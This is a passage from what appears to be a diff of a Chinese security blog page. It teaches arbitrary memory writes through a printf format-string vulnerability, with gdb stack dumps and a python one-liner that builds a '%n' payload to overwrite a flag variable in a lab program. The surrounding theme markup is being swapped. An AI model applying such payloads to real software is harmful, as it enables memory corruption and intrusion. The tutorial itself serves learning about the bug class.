+<h2 id="0x03任意地址写入内存"><a href="#0x03任意地址写入内存" class="headerlink" title="0x03任意地址写入内存"></a>0x03任意地址写入内存</h2><p>在上一节，利用格式化字符串漏洞覆写了flag的值。因为在栈中变量p，保存了flag的地址，直接计算偏移可以找到flag。但若要修改任意内存，<br>仅仅通过这种方式是不足以实现的。与”%s”读取任意内存地址类似，也可以先写入要修改的内存的地址，来实现任意内存写入。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ x/33wx $esp</div><div class="line">0xffffd520:	0xffffd534	0xffffd534	0x03c0003f	0x00000000</div><div class="line">0xffffd530:	0xffffd5e4	0x30303225	0x33257830	0x006e2431</div><div class="line">0xffffd540:	0xf7ffd938	0x00000000	0x000000c2	0xf7ea3716</div><div class="line">0xffffd550:	0xffffffff	0xffffd57e	0xf7e1bc34	0xf7e41fe3</div><div class="line">0xffffd560:	0x00000000	0x00c10000	0x00000001	0x0804831d</div><div class="line">0xffffd570:	0xffffd7a9	0x0000002f	0x0804a000	0x08048552</div><div class="line">0xffffd580:	0x00000001	0xffffd644	0xffffd64c	0xf7e4219d</div><div class="line">0xffffd590:	0xf7fb63c4	0xf7ffd000	0x000007d0	0xffffd598</div><div class="line">0xffffd5a0:	0x08048500</div></pre></td></tr></table></figure></p>
+<p>flag的地址为0xffffd598,使用python构造字符串。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c <span class="string">'print "\x98\xd5\xff\xff%1996x%5$n"'</span> &gt; <span class="number">111</span></div></pre></td></tr></table></figure></p>
+<p>在printf函数入口处断下，查看堆栈。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0xffffd51c --&gt; 0x80484d6 (&lt;main+57&gt;:	mov    eax,DWORD PTR [esp+0x78])</div><div class="line">0004| 0xffffd520 --&gt; 0xffffd534 --&gt; 0xffffd598 --&gt; 0x0 </div><div class="line">0008| 0xffffd524 --&gt; 0xffffd534 --&gt; 0xffffd598 --&gt; 0x0 </div><div class="line">0012| 0xffffd528 --&gt; 0x3c0003f </div><div class="line">0016| 0xffffd52c --&gt; 0x0 </div><div class="line">0020| 0xffffd530 --&gt; 0xffffd5e4 --&gt; 0x8d2e47d1 </div><div class="line">0024| 0xffffd534 --&gt; 0xffffd598 --&gt; 0x0 </div><div class="line">0028| 0xffffd538 (&quot;%1996x%5$n&quot;)</div><div class="line">[------------------------------------------------------------------------------]</div></pre></td></tr></table></figure></p>
+<p>输入的内容保存在数组a中，起始地址为0xffffd534。要覆写的地址的栈偏移为5，而在”%5$n”前，将输出4个字符的地址与宽度为1996的16进制数据。<br>所以一共输出了2000个字符，程序将向栈偏移为5的空间所存放的地址即0xffffd598指向的内存中写入2000。</p>
+<p><font color="green" face="黑体"></font>这里要注意的是，”%5$n”,固定寻找栈偏移为5的栈空间，与前面有几个”%”格式化说明符无关。要控制写入内存的值，可以通过控制输出的宽度来实现。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0xffffd520 --&gt; 0xffffd534 --&gt; 0xffffd598 --&gt; 0x7d0 </div><div class="line">0004| 0xffffd524 --&gt; 0xffffd534 --&gt; 0xffffd598 --&gt; 0x7d0 </div><div class="line">0008| 0xffffd528 --&gt; 0x3c0003f </div><div class="line">0012| 0xffffd52c --&gt; 0x0 </div><div class="line">0016| 0xffffd530 --&gt; 0xffffd5e4 --&gt; 0x8d2e47d1 </div><div class="line">0020| 0xffffd534 --&gt; 0xffffd598 --&gt; 0x7d0 </div><div class="line">0024| 0xffffd538 (&quot;%1996x%5$n&quot;)</div><div class="line">0028| 0xffffd53c (&quot;6x%5$n&quot;)</div><div class="line">[------------------------------------------------------------------------------]</div></pre></td></tr></table></figure></p>
+<p>printf函数执行后，可以看到 0xffffd598所指向的内存写入了0x7d0。</p>
 
-      
-    </div>
-
-    <div>
-      
         
-
-      
-    </div>
-
-    <div>
-      
+            
         
-
-      
     </div>
-
-    <div>
-      
+    <div class="post-footer main-content-wrap">
         
+            <div class="post-footer-tags">
+                <span class="text-color-light text-small">TAGGED IN</span><br/>
+                
+    <a class="tag tag--primary tag--small t-link" href="/tags/格式化字符串/">格式化字符串</a> <a class="tag tag--primary tag--small t-link" href="/tags/漏洞/">漏洞</a>
 
-      
-    </div>
-
-    <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/漏洞/" rel="tag"># 漏洞</a>
-          
-            <a href="/tags/原理/" rel="tag"># 原理</a>
-          
-        </div>
-      
-
-      
+            </div>
         
-      
-
-      
-
-      
-      
-    </footer>
-  </article>
-
-
-
-    <div class="post-spread">
-      
-    </div>
-  </div>
-
-
-          </div>
-          
-
-
-          
-  <div class="comments" id="comments">
-    
-  </div>
-
-
-        </div>
-        
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    <div class="sidebar-inner">
-
-      
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview">
-            站点概览
-          </li>
+        <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/2017/03/23/格式化字符串漏洞（二）漏洞利用/"  data-tooltip="格式化字符串漏洞（二）漏洞利用">
+                
+                    <i class="fa fa-angle-left"></i>
+                    <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+                </a>
+            </li>
+            <li class="post-action">
+                
+                    <a class="post-action-btn btn btn--disabled">
+                
+                    <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+                    <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
         </ul>
-      
+    </nav>
+    
+</div>
 
-      <section class="site-overview sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-          <img class="site-author-image" itemprop="image"
-               src="/images/avatar.gif"
-               alt="mara silence" />
-          <p class="site-author-name" itemprop="name">mara silence</p>
-           
-              <p class="site-description motion-element" itemprop="description"></p>
-          
-        </div>
-        <nav class="site-state motion-element">
-
-          
-            <div class="site-state-item site-state-posts">
-              <a href="/archives">
-                <span class="site-state-item-count">1</span>
-                <span class="site-state-item-name">日志</span>
-              </a>
-            </div>
-          
-
-          
-            
-            
-            <div class="site-state-item site-state-categories">
-              
-                <span class="site-state-item-count">1</span>
-                <span class="site-state-item-name">分类</span>
-              
-            </div>
-          
-
-          
-            
-            
-            <div class="site-state-item site-state-tags">
-              <a href="/tags/index.html">
-                <span class="site-state-item-count">2</span>
-                <span class="site-state-item-name">标签</span>
-              </a>
-            </div>
-          
-
-        </nav>
 
         
+    </div>
+    <div class="post-bottom-bar">
+        <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/2017/03/23/格式化字符串漏洞（二）漏洞利用/"  data-tooltip="格式化字符串漏洞（二）漏洞利用">
+                
+                    <i class="fa fa-angle-left"></i>
+                    <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+                </a>
+            </li>
+            <li class="post-action">
+                
+                    <a class="post-action-btn btn btn--disabled">
+                
+                    <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+                    <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+        </ul>
+    </nav>
+    
+</div>
 
-        <div class="links-of-author motion-element">
-          
-        </div>
-
-        
-        
-
-        
-        
-
-        
-
-
-      </section>
-
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Printf格式化字符串漏洞"><span class="nav-number">1.</span> <span class="nav-text">Printf格式化字符串漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-格式化字符串"><span class="nav-number">1.1.</span> <span class="nav-text">0x01 格式化字符串</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-漏洞原理"><span class="nav-number">1.2.</span> <span class="nav-text">0x02 漏洞原理</span></a></li></ol></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
-      
-
-      
 
     </div>
-  </aside>
+</article>
 
 
+
+                <footer id="footer" class="main-content-wrap">
+    <div class="copyrights">
+        Copyrights &copy; 2017 mara silence. All Rights Reserved.
         
-      </div>
-    </main>
+    </div>
+    <div class="copyrights">
+    	Powered by <a href="http://hexo.io/" target="_blank" rel="nofollow">Hexo</a>  
+    </div>
+</footer>
 
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright" >
-  
-  &copy; 
-  <span itemprop="copyrightYear">2017</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">mara silence</span>
+            </div>
+        </div>
+        <div id="about">
+    <div id="about-card">
+        <div id="about-btn-close">
+            <i class="fa fa-remove"></i>
+        </div>
+        
+            <h4 id="about-card-name">mara silence</h4>
+        
+        
+        
+    </div>
 </div>
+        <div id="cover" style="background-image:url('/assets/images/cover.png');"></div>
+    </body>
+    <!--SCRIPTS-->
+<script src="/assets/js/jquery.js"></script>
+<script src="/assets/js/jquery.fancybox.js"></script>
+<script src="/assets/js/jquery.fancybox-thumbs.js"></script>
+<script src="/assets/js/tranquilpeak.js"></script>
+<!--SCRIPTS END-->
 
 
-<div class="powered-by">
-  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
-</div>
-
-<div class="theme-info">
-  主题 -
-  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
-    NexT.Pisces
-  </a>
-</div>
-
-
-        
-
-        
-      </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-      </div>
-    
-
-  </div>
-
-  
-
-<script type="text/javascript">
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
-</script>
-
-
-
-
-
-
-
-
-
-  
-
-
-
-
-  
-  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
-
-  
-  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
-
-  
-  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
-
-  
-  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-
-  
-  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-  
-  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
-
-  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
-
-
-
-  
-  
-
-
-  <script type="text/javascript" src="/js/src/affix.js?v=5.1.0"></script>
-
-  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.0"></script>
-
-
-
-  
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
-
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
-
-
-
-  
-
-
-
-  
-
-
-
-
-	
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-  
-
-  
-
-  
-
-</body>
 </html>
